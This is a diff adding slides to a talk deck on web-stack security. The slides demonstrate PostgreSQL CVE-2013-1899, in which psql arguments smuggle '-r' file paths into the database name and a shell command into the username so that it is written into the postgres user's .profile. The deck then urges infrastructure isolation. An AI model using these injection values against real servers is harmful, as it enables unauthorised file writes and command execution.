@@ -256,6 +256,70 @@ html
       section
         h2.full-slide Best Practices Are Important
 
+      section
+        h2.full-slide PostgreSQL
+        ul.stack.corner
+          li.lowlight Your Code
+          li.lowlight Web Framework
+          li.lowlight Programming Language
+          li.lowlight Web Server
+          li Database
+          li.lowlight Network Transport
+      
+      section
+        h2 Postgres
+        pre
+          code.language-bash.
+            psql --host="example.com" \
+                 --dbname="blogdb"
+      section
+        h2 Postgres
+        h4 CVE-2013-1899
+        pre
+          code.language-bash.
+            psql --host="example.com" \
+                 --dbname="-r /var/lib/postgres/data/db"
+      section
+        h2 Postgres
+        h4 CVE-2013-1899
+        pre
+          code.language-bash.
+            no pg_hba.conf entry for host "example.com", 
+              user "postgres", database "-r my_provided_filename"
+      section
+        h2 Postgres
+        h4 CVE-2013-1899
+        pre
+          code.language-bash.
+            psql --host="example.com" \
+                 --dbname="-r /var/lib/postgres/.profile" \
+                 --username="
+                 echo 'Hello' #"
+      section
+        h2 Postgres
+        h4 CVE-2013-1899
+        pre
+          code.language-bash.
+            $ cat .profile
+            [...]
+            no pg_hba.conf entry for host "example.com", user "
+            echo 'Hello' #", database "-r /var/lib/postgres/.profile"
+
+        pre
+          code.language-bash.
+            $ su - postgres
+            no: command not found
+            Hello
+      section
+        h2.full-slide Isolate Your Infrastructure
+        p (And everything else)
+        aside
+          ul
+            li No auth required
+            li Filtering in Postgres wouldn't've worked
+            li Only safe with a hard firewall in the way
+            li Don't rely on one single point of failure for security
+            li Huge problems for Heroku etc
 
     // build:js scripts/scripts.js
     script(src='bower_components/bespoke.js/dist/bespoke.min.js')
@@ -268,6 +332,7 @@ html
     script(src='bower_components/prism/components/prism-ruby.js')
     script(src='bower_components/prism/components/prism-php.js')
     script(src='bower_components/prism/components/prism-c.js')
+    script(src='bower_components/prism/components/prism-bash.js')
     script(src='scripts/prism-yaml.js')
     script(src='scripts/main.js')
     // endbuild
